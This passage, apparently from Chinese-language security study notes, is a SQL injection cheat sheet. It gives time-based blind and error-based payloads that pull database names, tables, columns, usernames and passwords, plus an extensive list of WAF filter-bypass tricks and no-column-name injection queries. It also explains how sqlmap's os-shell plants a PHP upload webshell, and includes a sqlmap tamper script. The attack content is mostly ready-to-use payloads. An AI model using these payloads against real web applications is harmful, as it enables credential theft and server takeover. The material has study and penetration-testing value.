<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库长：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆库名：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆表名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;</span>r<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆列明：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆数据：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<p>其他皆可以此类推。</p>
<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a><center>group_concat的使用</center></h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>


<p>其他以此类推。</p>
<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a><center>SQL注入绕过速查表</center></h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>


<h2 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>


<h2 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union\select"></a>过滤union\select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">例：</span><br><span class="line">过滤代码 <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">十六进制字符绕过</span><br><span class="line"><span class="keyword">select</span> ——<span class="operator">&gt;</span> selec\x74</span><br><span class="line"><span class="keyword">union</span>——<span class="operator">&gt;</span>unio\x6e</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">SelEct</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"></span><br><span class="line">关键字内联绕所有</span><br><span class="line"><span class="comment">/*!union*/</span></span><br><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用Tab代替空格<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span>()</span><br><span class="line">绕过空格注释符绕过<span class="operator">/</span><span class="operator">/</span><span class="comment">--%20/**/#--+-- -;%00;</span></span><br><span class="line"></span><br><span class="line">空白字符绕过SQLite3  ——     <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>c,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MYSQL</span><br><span class="line">    <span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>B,<span class="number">0</span>D,A0,<span class="number">20</span></span><br><span class="line">PosgressSQL</span><br><span class="line">    <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">Oracle_11g</span><br><span class="line">    <span class="number">00</span>,<span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MSSQL</span><br><span class="line">    <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="keyword">OF</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line">特殊符号绕过</span><br><span class="line">    `  <span class="operator">+</span>  ！</span><br><span class="line">等科学计数法绕过</span><br><span class="line">    例：</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id0e1union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">unicode编码</span><br><span class="line">    <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">    <span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span>c0<span class="operator">%</span>a0 <span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br></pre></td></tr></table></figure>


<h2 id="过滤-x3D"><a href="#过滤-x3D" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span></span><br><span class="line"><span class="string">or &#x27;</span><span class="number">1</span><span class="string">&#x27; IN (&#x27;</span><span class="number">1234</span><span class="string">&#x27;)#可以替代=</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤比较符-lt-gt"><a href="#过滤比较符-lt-gt" class="headerlink" title="过滤比较符&lt;&gt;"></a>过滤比较符&lt;&gt;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admin</span><br></pre></td></tr></table></figure>


<h2 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">宽字节绕过</span></span><br><span class="line"><span class="string">%bf%27 %df%27 %aa%27</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<span class="keyword">from</span> <span class="keyword">to</span>的方式来解决：</span><br><span class="line">selectsubstr(database(<span class="number">0</span>from1for1);selectmid(database(<span class="number">0</span>from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用<span class="keyword">offset</span>来绕过：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromnews limit0,<span class="number">1</span># 等价于下面这条<span class="keyword">SQL</span>语句<span class="keyword">select</span><span class="operator">*</span>fromnews limit1offset0</span><br></pre></td></tr></table></figure>


<h2 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>


<h2 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line"></span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) </span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<h2 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>


<h2 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PostgreSQL支持XML函数：<span class="keyword">Select</span> UpdateXML(‘<span class="operator">&lt;</span>script x<span class="operator">=</span>_<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span> ’,’<span class="operator">/</span>script<span class="operator">/</span><span class="variable">@x</span><span class="operator">/</span>’,’src<span class="operator">=</span><span class="operator">/</span><span class="operator">/</span>evil.com’);　　　　　　　　　　</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> xmlelement(name img,xmlattributes(<span class="number">1</span><span class="keyword">as</span> src,<span class="string">&#x27;a\l\x65rt(1)&#x27;</span><span class="keyword">as</span> \<span class="number">117</span>n\x65rror));　<span class="operator">/</span><span class="operator">/</span>postgresql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>))</span><br></pre></td></tr></table></figure>


<h2 id="N绕过"><a href="#N绕过" class="headerlink" title="\N绕过"></a>\N绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><center>无列名注入</center></h1><p>遇到information_schema.tables被过滤、转义、删除的情况下使用</p>
<p>Payload</p>
<p>猜表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>猜数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><center>Sqlmap</center></h1><h2 id="–os-shell的原理"><a href="#–os-shell的原理" class="headerlink" title="–os-shell的原理"></a>–os-shell的原理</h2><ul>
<li>使用条件<ol>
<li>网站必须是root权限</li>
<li>攻击者需要知道网站的绝对路径</li>
<li>GPC为off，php主动转义的功能关闭</li>
</ol>
</li>
</ul>
<p>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownunsKjTko6QxSAY3.png"></p>
<p>也就是上传一个功能马</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##此处用法为：程序到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多行注释符，此处为三个双引号，因为是其中也有单引号，并且该说明为一般文档说明，故用三个双引号</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#导入python中的re 字符替换包，方便下面的字符替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb <span class="comment">#导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kb</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY  <span class="comment">#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py</span></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL <span class="comment">#定义优先级，此处为级别为【一般】</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():  <span class="comment">#定义dependencies():此处是为了和整体脚本的结构保持一致。</span></span><br><span class="line">    <span class="keyword">pass</span>   <span class="comment">#pass 不做任何事情，一般用做占位语句。为了保持程序结构的完整性。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):  <span class="comment">#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125; </span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;like&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="增加新的Payload"><a href="#增加新的Payload" class="headerlink" title="增加新的Payload"></a>增加新的Payload</h2><p>目录在<code>./data/xml/payload</code></p>
<p>可以看到6个xml文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowncjM2FqdQuzpoN9C.png"></p>
<p>拿<code>boolean_blind.xml文件</code>里面的一部分来分析</p>
